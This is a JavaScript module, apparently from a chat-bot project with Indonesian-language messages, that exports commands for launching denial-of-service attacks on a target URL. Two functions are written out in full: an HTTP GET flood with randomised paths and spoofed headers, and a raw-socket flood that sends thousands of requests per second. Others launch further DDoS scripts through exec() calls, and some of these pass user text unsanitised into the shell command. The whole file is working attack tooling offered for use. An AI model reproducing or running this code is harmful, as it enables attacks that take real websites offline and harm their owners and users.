const { exec } = require("child_process");
const { URL, parse } = require("url");
const http = require("http");
const https = require("https");
const net = require("net");
const util = require("util");

const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
const randStr = len => Array.from({ length: len }, () => chars[Math.floor(Math.random() * chars.length)]).join("");
const randIp = () => Array(4).fill().map(() => Math.floor(Math.random() * 255)).join(".");

module.exports = {
  ambatukam({ target, duration, rate, reply }) {
    const parsed = new URL(target);
    const lib = parsed.protocol === "https:" ? https : http;

    function floodOnce() {
      const options = {
        method: "GET",
        host: parsed.hostname,
        path: parsed.pathname + "/" + randStr(6) + "?" + randStr(3) + "=" + randStr(5),
        port: parsed.port || (parsed.protocol === "https:" ? 443 : 80),
        headers: {
          "User-Agent": `Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/${Math.floor(Math.random() * 100)}.0.${randStr(3)}.0`,
          "X-Forwarded-For": randIp(),
          "Referer": `https://${parsed.hostname}/${randStr(4)}`,
          "Connection": "keep-alive"
        },
        agent: false,
        timeout: 5000
      };
      const req = lib.request(options, () => {});
      req.on("error", () => {});
      req.end();
    }

    reply(` Menyerang ${target}\n Durasi  : ${duration}s\n Rate    : ${rate} req/s`);
    const interval = setInterval(() => {
      for (let i = 0; i < rate; i++) floodOnce();
    }, 1000);

    setTimeout(() => {
      clearInterval(interval);
      reply(` Serangan ke ${target} selesai (${duration}s).`);
    }, duration * 1000);
  },

  rawflood({ target, time, reply }) {
    const parsed = parse(target);
    const host = parsed.host;
    const UAs = [
      "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
      "Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0;  rv:11.0) like Gecko",
      "Mozilla/5.0 (X11; Linux x86_64; en-US) AppleWebKit/534.16 Chrome/10.0.648.127 Safari/534.16",
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_4; en-US) AppleWebKit/534.16 Chrome/10.0.648.127 Safari/534.16"
    ];

    reply(` RAW FLOOD dimulai ke ${target}\nDurasi: ${time}s\nPort: 80`);
    const int = setInterval(() => {
      const socket = net.Socket();
      socket.connect(80, host);
      socket.setTimeout(5000);

      for (let i = 0; i < 2000; i++) {
        socket.write(
          `GET ${target} HTTP/1.2\r\nHost: ${host}\r\nUser-Agent: ${UAs[Math.floor(Math.random() * UAs.length)]}\r\nAccept: */*\r\nConnection: Keep-Alive\r\n\r\n`
        );
      }

      socket.on("data", () => {
        setTimeout(() => socket.destroy(), 1000);
      });

      socket.on("error", () => socket.destroy());
    }, 100);

    setTimeout(() => {
      clearInterval(int);
      reply(` RAW Flood ke ${target} selesai.`);
    }, time * 1000);
  },

  brow({ text, reply }) {
    reply(`Serangan DDoS telah dieksekusi ke:\n> TARGET : ${text}\n> TIME : 60\n> THREAD : 20\n> RATE : 100`);
    exec(`node ./node_modules/Arisu-MD/lib/DDoS/brow.js ${text} 60 20 100`, (err, stdout) => {
      if (err) return console.log(err.toString());
      if (stdout) console.log(util.format(stdout));
    });
  },

  mix({ text, reply }) {
    reply(`Serangan DDoS telah dieksekusi ke:\n> TARGET : ${text}\n> TIME : 60\n> THREAD : 20\n> RATE : 100`);
    exec(`node ./node_modules/Arisu-MD/lib/DDoS/mix.js ${text} 60 20 100`, (err, stdout) => {
      if (err) return console.log(err.toString());
      if (stdout) console.log(util.format(stdout));
    });
  },

  killweb: async ({ target, duration, reply }) => {
    const runKillWeb = require('../lib/DDoS/killweb');
    await runKillWeb(target, duration);

    reply(`✅ Serangan ke ${target} selama ${duration}s dimulai!`);
    setTimeout(() => {
      reply(`⏱️ Serangan ke ${target} telah selesai setelah ${duration}s.`);
    }, duration * 1000);
  },

  lol({ text, reply }) {
    let ddosin = require("../lib/DDoS/lol.js");
    ddosin(`${text}`);
    reply(`Serangan DDoS telah dieksekusi ke Situs Web:\n> TARGET : ${text}\n> TIME : 60\n> THREAD : 20\n> RATE : 100`);
    exec(`node ./node_modules/Arisu-MD/lib/DDoS/lol.js`, (err, stdout) => {
      if (err) return console.log(err.toString());
      if (stdout) return console.log(util.format(stdout));
    });
  }
};